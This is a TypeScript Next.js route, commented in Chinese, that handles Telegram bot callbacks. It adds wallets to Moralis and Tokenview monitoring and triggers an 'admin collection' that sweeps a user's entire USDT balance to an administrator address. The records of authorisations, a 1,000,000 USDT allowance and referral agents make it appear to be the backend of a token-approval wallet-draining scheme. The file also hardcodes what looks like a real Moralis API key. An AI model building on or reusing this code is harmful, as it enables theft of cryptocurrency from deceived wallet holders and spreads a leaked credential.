/**
 * Telegram Bot Callback 处理器
 * 处理内联键盘按钮点击事件
 */

import { NextRequest, NextResponse } from 'next/server'
import { createClient } from '@supabase/supabase-js'
import Moralis from 'moralis'

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!
)

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN!
const MORALIS_API_KEY = process.env.MORALIS_API_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjY5ZDY3MjkwLWIxMTYtNDIwNC04MzhjLTE4NTJjMzU2YWIyOSIsIm9yZ0lkIjoiNDc0NjA0IiwidXNlcklkIjoiNDg4MjQ3IiwidHlwZUlkIjoiMzQ4NmRkMzktOTBlOC00YTAxLWI0NWItMGJhNWQ2MWFiYTMxIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NTk4NDYwMzcsImV4cCI6NDkxNTYwNjAzN30.RIEwHUZ5nluSbvV3clgcclLLE5sha4BUxGHiyxiFa2A'

// 初始化 Moralis
let moralisInitialized = false

async function initMoralis() {
  if (!moralisInitialized) {
    await Moralis.start({
      apiKey: MORALIS_API_KEY,
    })
    moralisInitialized = true
    console.log('Moralis SDK 初始化成功')
  }
}

// 发送Telegram回复消息
async function sendTelegramAnswer(callbackQueryId: string, text: string, showAlert = false) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text: text,
        show_alert: showAlert,
      }),
    })
    
    const result = await response.json()
    return result.ok
  } catch (error) {
    console.error('发送Telegram回复失败:', error)
    return false
  }
}

// 编辑消息添加成功标记
async function editTelegramMessage(chatId: string, messageId: number, text: string) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: text,
        parse_mode: 'HTML',
      }),
    })
    
    const result = await response.json()
    return result.ok
  } catch (error) {
    console.error('编辑Telegram消息失败:', error)
    return false
  }
}

// 添加地址到 Moralis Stream 监听
async function addAddressToMoralisStream(address: string) {
  try {
    await initMoralis()
    
    console.log('📡 添加地址到 Moralis 监听:', address)
    
    // 固定的 stream ID
    const streamId = 'eth-usdt-monitor'
    const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
    const WEBHOOK_URL = `${process.env.NEXT_PUBLIC_APP_URL || 'https://ethmax.vercel.app'}/api/moralis/webhook`
    
    try {
      // 尝试添加地址到现有stream
      await Moralis.Streams.addAddress({
        id: streamId,
        address: [address],
      })
      
      console.log('✅ 地址已添加到现有 Moralis Stream')
      return true
    } catch (streamError) {
      // 如果 Stream 不存在，创建新的
      const errorMessage = streamError instanceof Error ? streamError.message : String(streamError)
      if (errorMessage.includes('not found') || errorMessage.includes('does not exist')) {
        console.log('📝 Stream 不存在，创建新的 Moralis Stream...')
        
        const stream = await Moralis.Streams.add({
          chains: ['0x1'], // Ethereum mainnet
          description: 'ETH USDT Transaction Monitor',
          tag: streamId,
          webhookUrl: WEBHOOK_URL,
          includeNativeTxs: false,
          includeContractLogs: true,
          abi: [
            {
              anonymous: false,
              inputs: [
                { indexed: true, name: 'from', type: 'address' },
                { indexed: true, name: 'to', type: 'address' },
                { indexed: false, name: 'value', type: 'uint256' }
              ],
              name: 'Transfer',
              type: 'event'
            }
          ],
          topic0: ['Transfer(address,address,uint256)'],
          advancedOptions: [
            {
              topic0: 'Transfer(address,address,uint256)',
              filter: { eq: ['address', USDT_CONTRACT] }
            }
          ],
        })
        
        // 添加地址到新创建的 stream（使用返回的stream对象的id属性）
        const newStreamId = (stream as any).id || streamId
        await Moralis.Streams.addAddress({
          id: newStreamId,
          address: [address],
        })
        
        console.log('✅ 创建 Moralis Stream 并添加地址成功')
        return true
      } else {
        throw streamError
      }
    }
  } catch (error) {
    console.error('❌ 添加地址到 Moralis 失败:', error)
    return false
  }
}

// 发送新的Telegram消息
async function sendTelegramMessage(chatId: string, text: string, replyMarkup?: any) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
        reply_markup: replyMarkup,
      }),
    })
    
    const result = await response.json()
    return result.ok
  } catch (error) {
    console.error('发送Telegram消息失败:', error)
    return false
  }
}

// 获取完整用户信息（包括链上余额、代理信息）
async function getUserCompleteInfo(address: string) {
  try {
    // 查询用户详细信息
    const { data: memberData, error } = await supabase
      .from('nh_member_new')
      .select(`
        id,
        wallet_address,
        auth_wallet_address,
        agent_id,
        is_active,
        telegram_user_id,
        usdt,
        eth
      `)
      .eq('wallet_address', address)
      .eq('is_active', true)
      .single()

    if (error || !memberData) {
      console.error('查询用户信息失败:', error)
      return null
    }

    // 生成用户编号（与管理后台同步）- 8位数字格式
    let userNumber = '未知'
    if (memberData.id) {
      const cleanUuid = memberData.id.replace(/-/g, '')
      let hash = 0
      for (let i = 0; i < cleanUuid.length; i++) {
        const char = cleanUuid.charCodeAt(i)
        hash = ((hash << 5) - hash) + char
        hash = hash & hash
      }
      const numericId = Math.abs(hash) % 100000000
      userNumber = numericId.toString().padStart(8, '0')
    }

    // 获取代理信息
    let topAgent = '默认代理'
    let agentNickname = '直链授权'

    if (memberData.agent_id && memberData.agent_id > 0) {
      try {
        const { data: agentData } = await supabase
          .from('nh_agents')
          .select('agent_name, referral_code')
          .eq('id', memberData.agent_id)
          .single()

        if (agentData) {
          topAgent = agentData.agent_name || '默认代理'
          agentNickname = agentData.referral_code || '直链授权'
        }
      } catch (err) {
        console.log('获取代理信息失败，使用默认值')
      }
    }

    // 查询链上USDT余额
    const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
    const ETH_RPC_URL = 'https://ethereum.publicnode.com'
    const cleanAddress = address.toLowerCase().replace('0x', '')
    
    let onChainBalance = '0.000000'
    try {
      const balanceResponse = await fetch(ETH_RPC_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          method: 'eth_call',
          params: [{
            to: USDT_CONTRACT,
            data: `0x70a08231000000000000000000000000${cleanAddress}`
          }, 'latest'],
          id: 1
        })
      })
      const balanceData = await balanceResponse.json()
      if (balanceData.result) {
        const balanceWei = BigInt(balanceData.result)
        const balance = Number(balanceWei) / Math.pow(10, 6)
        onChainBalance = balance.toFixed(6)
      }
    } catch (balanceError) {
      console.error('查询链上余额失败:', balanceError)
    }

    const userRemark = memberData.telegram_user_id || '暂无备注'
    const isActive = memberData.is_active ? '是' : '否'

    return {
      userId: memberData.id,
      address: memberData.wallet_address,
      authWalletAddress: memberData.auth_wallet_address || memberData.wallet_address,
      usdtBalance: onChainBalance,
      ethBalance: (memberData.eth || 0).toString(),
      allowance: '1000000',
      isAuthorized: isActive,
      userNumber: userNumber,
      superiorAgent: topAgent,
      agentNickname: agentNickname,
      userRemark: userRemark,
      authAddress: '0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218'
    }
  } catch (error) {
    console.error('获取用户完整信息异常:', error)
    return null
  }
}

// 处理归集余额的回调
async function handleCollectionCallback(address: string, callbackQueryId: string, chatId: string, messageId: number) {
  try {
    console.log('💰 开始处理归集余额请求:', address)
    
    // 1. 查询完整用户信息
    const userInfo = await getUserCompleteInfo(address)
    
    if (!userInfo) {
      console.error('❌ 未找到用户:', address)
      // 发送错误消息（不调用 sendTelegramAnswer，因为已经在外层响应了）
      await sendTelegramMessage(chatId, `❌ 归集失败

钱包地址: ${address}
原因: 未找到该用户
时间: ${new Date().toLocaleString('zh-CN')}`)
      return
    }
    
    // 2. 默认归集全部余额
    const amount = 0 // 0表示归集全部余额
    
    console.log('📡 调用归集API...')
    
    // 3. 调用归集接口
    const collectionResponse = await fetch(`${process.env.NEXT_PUBLIC_APP_URL || 'https://ethmax.vercel.app'}/api/admin/real-balance-collection`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress: address,
        amount: amount
      })
    })
    
    const collectionResult = await collectionResponse.json()
    
    if (collectionResult.success) {
      const txHash = collectionResult.data?.transactionHash || collectionResult.data?.txHash || '无'
      const collectedAmount = collectionResult.data?.amount || userInfo.usdtBalance
      const toAddress = collectionResult.data?.toAddress || '管理员地址'
      
      // 构建归集成功消息（格式与其他通知一致）
      const message = `🔵归集USDT 提醒       -${collectedAmount} USDT

钱包余额: ${userInfo.usdtBalance}
顶层代理: ${userInfo.superiorAgent}
代理昵称: ${userInfo.agentNickname}
用户编号: ${userInfo.userNumber}
用户备注: ${userInfo.userRemark}
是否活动: ${userInfo.isAuthorized}
用户钱包: 
${userInfo.address}
订单金额: -${collectedAmount} USDT
授权金额: ${userInfo.allowance} USDT
客户地址: 
${userInfo.address.toLowerCase()}
归集到地址: 
${toAddress}
执行操作: 管理员归集余额
授权对象: 
${userInfo.authAddress}
交易哈希: 
${txHash}
时间: ${new Date().toLocaleString('zh-CN')}`
      
      // 发送新消息（不调用 sendTelegramAnswer，因为已经在外层响应了）
      await sendTelegramMessage(chatId, message)
      
      console.log('✅ 归集成功并已通知:', address, collectedAmount, 'USDT')
    } else {
      console.error('❌ 归集失败:', collectionResult.error)
      
      // 发送归集失败消息
      const errorMessage = `❌ 归集失败

钱包余额: ${userInfo.usdtBalance}
顶层代理: ${userInfo.superiorAgent}
代理昵称: ${userInfo.agentNickname}
用户编号: ${userInfo.userNumber}
用户钱包: 
${userInfo.address}
失败原因: ${collectionResult.error || '未知错误'}
时间: ${new Date().toLocaleString('zh-CN')}`
      
      await sendTelegramMessage(chatId, errorMessage)
    }
    
  } catch (error) {
    console.error('❌ 处理归集异常:', error)
    // 发送错误消息
    await sendTelegramMessage(chatId, `❌ 归集处理异常

原因: ${error instanceof Error ? error.message : '未知错误'}
时间: ${new Date().toLocaleString('zh-CN')}`)
  }
}

// 处理添加监听地址的回调
async function handleAddMonitorCallback(address: string, callbackQueryId: string, chatId: string, messageId: number) {
  try {
    console.log('📍 开始处理添加监听请求:', address)
    
    // 1. 查询完整用户信息
    const userInfo = await getUserCompleteInfo(address)
    
    if (!userInfo) {
      console.error('❌ 未找到用户:', address)
      // 发送错误消息（不调用 sendTelegramAnswer，因为已经在外层响应了）
      await sendTelegramMessage(chatId, `❌ 添加监听失败

钱包地址: ${address}
原因: 未找到该用户
时间: ${new Date().toLocaleString('zh-CN')}`)
      return
    }
    
    // 2. 添加到数据库 wallet_monitor 表
    const { error: monitorError } = await supabase
      .from('wallet_monitor')
      .upsert({
        member_id: userInfo.userId,
        wallet_address: address,
        is_active: true,
        monitor_transactions: true,
        created_at: new Date().toISOString(),
      })
    
    if (monitorError) {
      console.error('❌ 添加到数据库失败:', monitorError)
      
      const errorMessage = `❌ 添加监听失败

钱包余额: ${userInfo.usdtBalance}
顶层代理: ${userInfo.superiorAgent}
代理昵称: ${userInfo.agentNickname}
用户编号: ${userInfo.userNumber}
用户钱包: 
${userInfo.address}
失败原因: ${monitorError.message}
时间: ${new Date().toLocaleString('zh-CN')}`
      
      await sendTelegramMessage(chatId, errorMessage)
      return
    }
    
    // 3. 添加到监控服务（Moralis + Tokenview）
    const { addAddressToTokenview } = await import('@/lib/tokenview')
    const moralisSuccess = await addAddressToMoralisStream(address)
    const tokenviewSuccess = await addAddressToTokenview(address).catch(() => false)
    
    // 构建添加监听成功消息
    const message = `✅ 添加监听成功

钱包余额: ${userInfo.usdtBalance}
顶层代理: ${userInfo.superiorAgent}
代理昵称: ${userInfo.agentNickname}
用户编号: ${userInfo.userNumber}
用户备注: ${userInfo.userRemark}
是否活动: ${userInfo.isAuthorized}
用户钱包: 
${userInfo.address}
监听状态: 已添加到链上实时监听
监听服务: ${moralisSuccess ? 'Moralis ✅' : 'Moralis ❌'} | ${tokenviewSuccess ? 'Tokenview ✅' : 'Tokenview ❌'}
执行操作: 添加链上交易监听
时间: ${new Date().toLocaleString('zh-CN')}`
    
    // 发送新消息（不调用 sendTelegramAnswer，因为已经在外层响应了）
    await sendTelegramMessage(chatId, message)
    
    console.log('✅ 添加监听成功:', address)
    
  } catch (error) {
    console.error('❌ 处理添加监听异常:', error)
    // 发送错误消息
    await sendTelegramMessage(chatId, `❌ 添加监听处理异常

原因: ${error instanceof Error ? error.message : '未知错误'}
时间: ${new Date().toLocaleString('zh-CN')}`)
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    
    console.log('📨 收到Telegram Callback:', JSON.stringify(body, null, 2))
    
    // 处理 callback_query
    if (body.callback_query) {
      const callbackQuery = body.callback_query
      const data = callbackQuery.data
      const callbackQueryId = callbackQuery.id
      const chatId = callbackQuery.message.chat.id.toString()
      const messageId = callbackQuery.message.message_id
      
      console.log('🔍 解析 Callback Data:', {
        data,
        callbackQueryId,
        chatId,
        messageId
      })
      
      // 立即响应 Telegram，避免超时（必须在5秒内）
      await sendTelegramAnswer(callbackQueryId, '处理中，请稍候...', false)
      console.log('✅ 已立即响应 Telegram 按钮点击')
      
      // 解析 callback_data 并异步处理
      if (data.startsWith('add_monitor:')) {
        const address = data.replace('add_monitor:', '')
        console.log('📍 处理添加监听请求:', address)
        // 异步处理，不等待结果
        handleAddMonitorCallback(address, callbackQueryId, chatId, messageId).catch(err => {
          console.error('处理添加监听失败:', err)
        })
      } else if (data.startsWith('collection:')) {
        const address = data.replace('collection:', '')
        console.log('💰 处理归集余额请求:', address)
        // 异步处理，不等待结果
        handleCollectionCallback(address, callbackQueryId, chatId, messageId).catch(err => {
          console.error('处理归集余额失败:', err)
        })
      }
    }
    
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error('处理Telegram Callback失败:', error)
    return NextResponse.json({
      success: false,
      error: error instanceof Error ? error.message : '未知错误'
    }, { status: 500 })
  }
}


